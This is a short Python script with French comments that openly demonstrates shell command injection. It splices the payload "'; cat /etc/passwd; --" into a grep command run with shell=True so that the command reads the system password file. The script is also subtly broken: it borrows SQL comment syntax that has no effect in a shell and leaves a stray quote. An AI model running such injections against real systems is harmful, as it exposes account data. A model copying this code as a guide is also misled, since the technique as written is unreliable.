# On importe les modules nécessaires pour exécuter des commandes système
import subprocess

# On crée une variable contenant notre payload, qui va injecter des commandes malveillantes dans la requête
payload = "'; cat /etc/passwd; --"

# On exécute la commande en utilisant notre payload pour injecter des commandes malveillantes
output = subprocess.check_output("cat utilisateurs.txt | grep '" + payload + "'", shell=True)

# On affiche les résultats de la commande
print(output)
